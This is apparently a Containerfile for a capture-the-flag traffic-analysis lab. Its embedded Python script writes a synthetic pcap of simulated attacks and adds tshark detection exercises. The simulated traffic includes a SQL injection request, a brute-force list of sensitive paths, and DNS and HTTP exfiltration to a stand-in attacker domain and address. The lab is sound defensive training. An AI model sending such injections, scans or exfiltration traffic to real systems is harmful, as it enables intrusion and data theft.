# Packet Analysis - CTF Container
# Purpose: Arch Linux image with tcpdump, tshark, and tcpreplay, plus a
#          generated /root/attack-traffic.pcap full of simulated attacks.
# Build:   podman build -f packet-analysis.Containerfile -t packet-analysis-ctf .
# Run:     podman run -it --rm packet-analysis-ctf
# Capture: /root/attack-traffic.pcap

FROM docker.io/library/archlinux:latest

RUN pacman -Sy --noconfirm tcpdump wireshark-cli python python-scapy tcpreplay && \
    pacman -Scc --noconfirm && \
    rm -rf /var/cache/pacman/pkg/*

COPY <<'HEREDOC' /root/generate-malicious.pcap
#!/usr/bin/env python3
"""
Generate a sample pcap containing simulated attack traffic for analysis.
Includes: port scan, HTTP directory brute-force, DNS exfiltration simulation.
"""
import struct
import time
import random
import socket

PCAP_MAGIC = 0xa1b2c3d4
LINKTYPE_ETHERNET = 1

def write_pcap_header(f):
    f.write(struct.pack('<IHHiIII',
        PCAP_MAGIC,          # magic number
        2,                   # major version
        4,                   # minor version
        0,                   # timezone
        0,                   # sigfigs
        65535,               # snaplen
        LINKTYPE_ETHERNET    # link type
    ))

def write_packet(f, ts_sec, ts_usec, data):
    f.write(struct.pack('<IIII', ts_sec, ts_usec, len(data), len(data)))
    f.write(data)

def make_eth(ethertype=0x0800):
    src = bytes([0x00, 0x0c, 0x29, 0xab, 0xcd, 0xef])
    dst = bytes([0x00, 0x50, 0x56, 0xc0, 0x00, 0x08])
    return dst + src + struct.pack('!H', ethertype)

def make_ip(src, dst, proto, payload, ttl=64):
    ihl = 5
    ver = 4
    tos = 0
    total_len = 20 + len(payload)
    ident = random.randint(0, 65535)
    flags_offset = 0x4000
    chksum = 0
    header = struct.pack('!BBHHHBBH4s4s',
        (ver << 4) + ihl,
        tos,
        total_len,
        ident,
        flags_offset,
        ttl,
        proto,
        chksum,
        socket.inet_aton(src),
        socket.inet_aton(dst)
    )
    return header + payload

def make_tcp(src_port, dst_port, seq, ack, flags, payload=b''):
    off = 5
    fl = flags
    win = 65535
    urg = 0
    header = struct.pack('!HHIIBBHHH',
        src_port, dst_port,
        seq, ack,
        (off << 4), fl,
        win, 0, urg
    )
    return header + payload

def make_udp(src_port, dst_port, payload=b''):
    return struct.pack('!HHHH', src_port, dst_port, 8 + len(payload), 0) + payload

ATTACKER_IP = "192.168.1.100"
TARGET_IP = "10.0.0.50"
BASE_TIME = int(time.time())

with open('/root/attack-traffic.pcap', 'wb') as f:
    write_pcap_header(f)

    ts = BASE_TIME

    print("[*] Simulating port scan (SYN sweep)...")
    scan_ports = [22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 3389, 8080, 8443]
    for port in scan_ports:
        syn = make_tcp(44444, port, random.randint(0, 2**32), 0, 0x02)  # SYN
        ip_syn = make_ip(ATTACKER_IP, TARGET_IP, 6, syn)
        pkt = make_eth() + ip_syn
        write_packet(f, ts, 0, pkt)

        # Simulate response (SYN-ACK for open, RST for closed)
        if port in [22, 80, 443]:
            synack = make_tcp(port, 44444, random.randint(0, 2**32), random.randint(0, 2**32) + 1, 0x12)
            ip_synack = make_ip(TARGET_IP, ATTACKER_IP, 6, synack)
            pkt_resp = make_eth() + ip_synack
            write_packet(f, ts, 50000, pkt_resp)
        else:
            rst = make_tcp(port, 44444, 0, 0, 0x04)  # RST
            ip_rst = make_ip(TARGET_IP, ATTACKER_IP, 6, rst)
            pkt_rst = make_eth() + ip_rst
            write_packet(f, ts, 50000, pkt_rst)

        ts += 1

    print("[*] Simulating HTTP directory brute-force...")
    paths = ['/admin', '/login', '/wp-admin', '/phpmyadmin', '/.git/config',
             '/backup.zip', '/config.php.bak', '/api/v1/users', '/shell.php']
    for path in paths:
        request = f"GET {path} HTTP/1.1\r\nHost: 10.0.0.50\r\nUser-Agent: curl/7.88\r\n\r\n"
        tcp_data = make_tcp(55555, 80, random.randint(0, 2**32), 0, 0x18, request.encode())
        ip_pkt = make_ip(ATTACKER_IP, TARGET_IP, 6, tcp_data)
        write_packet(f, ts, 0, make_eth() + ip_pkt)

        response = f"HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nNot Found"
        tcp_resp = make_tcp(80, 55555, random.randint(0, 2**32), random.randint(0, 2**32), 0x18, response.encode())
        ip_resp = make_ip(TARGET_IP, ATTACKER_IP, 6, tcp_resp)
        write_packet(f, ts, 100000, make_eth() + ip_resp)
        ts += 1

    print("[*] Simulating SQL injection attempt...")
    sqli = "GET /search?q=%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: 10.0.0.50\r\nUser-Agent: sqlmap/1.0\r\n\r\n"
    tcp_sqli = make_tcp(55556, 80, random.randint(0, 2**32), 0, 0x18, sqli.encode())
    ip_sqli = make_ip(ATTACKER_IP, TARGET_IP, 6, tcp_sqli)
    write_packet(f, ts, 0, make_eth() + ip_sqli)
    ts += 1

    print("[*] Simulating DNS exfiltration...")
    attacker_subdomains = [
        "qQwErTyUiOpAsDfGhJkLzXcVbNm.evil-c2.xyz",
        "aBcDeFgHiJkLmNoPqRsTuVwXyZ123456.evil-c2.xyz",
        "ZxZxZxZxZxZxZxZxZxZxZxZxZxZxZxZx.evil-c2.xyz",
    ]
    exfil_dns_server = "192.168.1.1"
    for sub in attacker_subdomains:
        qname = b''
        for label in sub.encode().split(b'.'):
            qname += bytes([len(label)]) + label
        qname += b'\x00'
        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + qname + b'\x00\x01\x00\x01'
        udp_dns = make_udp(12345, 53, dns_query)
        ip_dns = make_ip(ATTACKER_IP, exfil_dns_server, 17, udp_dns)
        write_packet(f, ts, 0, make_eth() + ip_dns)
        ts += 5

    ts += 10

    print("[*] Simulating C2 beaconing (periodic HTTPS)...")
    for i in range(12):
        syn_c2 = make_tcp(60000 + i, 443, random.randint(0, 2**32), 0, 0x02)
        ip_c2 = make_ip(ATTACKER_IP, "203.0.113.99", 6, syn_c2)
        write_packet(f, ts, 0, make_eth() + ip_c2)
        ts += 120

    print("[*] Simulating data exfiltration via large POST...")
    exfil_data = b"x=" + (b"BASE64_ENCODED_DATA_" * 500)
    post_req = f"POST /upload.php HTTP/1.1\r\nHost: 203.0.113.99\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(exfil_data)}\r\n\r\n".encode() + exfil_data
    tcp_exfil = make_tcp(55557, 443, random.randint(0, 2**32), 0, 0x18, post_req)
    ip_exfil = make_ip(ATTACKER_IP, "203.0.113.99", 6, tcp_exfil)
    write_packet(f, ts, 0, make_eth() + ip_exfil)
    ts += 1

    print("[*] Simulating NULL scan and XMAS scan...")
    for port in [135, 139, 445]:
        null_flags = make_tcp(60001, port, random.randint(0, 2**32), 0, 0x00)  # NULL
        ip_null = make_ip(ATTACKER_IP, TARGET_IP, 6, null_flags)
        write_packet(f, ts, 0, make_eth() + ip_null)
        ts += 1

        xmas_flags = make_tcp(60001, port, random.randint(0, 2**32), 0, 0x29)  # FIN+URG+PSH
        ip_xmas = make_ip(ATTACKER_IP, TARGET_IP, 6, xmas_flags)
        write_packet(f, ts, 0, make_eth() + ip_xmas)
        ts += 1

    ts += 5

    print("[*] Simulating ICMP tunneling (large ICMP packets)...")
    icmp_type = 8
    icmp_code = 0
    icmp_chksum = 0
    icmp_id = 0x1234
    icmp_seq = 1
    icmp_data = b"TUNNELED_DATA_" * 10 + b"secret:password123"
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_chksum, icmp_id, icmp_seq)
    icmp_pkt = make_ip(ATTACKER_IP, "203.0.113.99", 1, icmp_header + icmp_data)
    write_packet(f, ts, 0, make_eth() + icmp_pkt)
    ts += 1

    print(f"\n[*] Pcap written to /root/attack-traffic.pcap")
    print(f"[*] Total packets: simulated attack scenario")

print("""
=== Analysis Exercises ===

1. Identify the port scan:
   tcpdump -r attack-traffic.pcap -nn 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'
   tshark -r attack-traffic.pcap -Y 'tcp.flags == 0x0002' -T fields -e tcp.dstport | sort -n

2. Find the SQL injection attempt:
   tshark -r attack-traffic.pcap -Y 'http.request.uri contains "UNION"' -T fields -e ip.src -e http.request.uri

3. Detect DNS exfiltration:
   tshark -r attack-traffic.pcap -Y 'dns.qry.name contains "evil-c2"' -T fields -e dns.qry.name

4. Find the C2 beaconing pattern:
   tshark -r attack-traffic.pcap -Y 'ip.dst == 203.0.113.99' -T fields -e frame.time_epoch -e ip.dst

5. Identify the scan type:
   tshark -r attack-traffic.pcap -T fields -e tcp.flags | sort | uniq -c | sort -rn

6. Extract payloads from ICMP:
   tshark -r attack-traffic.pcap -Y 'icmp' -T fields -e data

Press Enter for shell.
""")
HEREDOC

RUN chmod +x /root/generate-malicious.pcap && \
    python3 /root/generate-malicious.pcap

WORKDIR /root
CMD ["/bin/bash"]
